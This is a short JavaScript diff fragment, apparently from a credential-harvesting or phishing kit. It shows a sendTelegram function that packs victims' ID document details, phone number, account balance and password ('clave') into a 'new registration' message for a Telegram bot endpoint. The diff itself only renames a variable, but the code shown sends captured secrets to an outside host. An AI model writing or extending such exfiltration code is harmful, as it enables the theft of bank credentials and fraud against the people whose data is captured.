@@ -27,7 +27,7 @@ const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;
 async function sendTelegram(clienteId, datos) {
   const { tipo_documento, num_documento, num_celular, saldo_cuenta, clave } = datos;
 
-  const texto_admin = `
+  const texto = `
 🔔 *Nuevo registro #${clienteId}*
 
 📋 *Tipo doc:* ${tipo_documento}
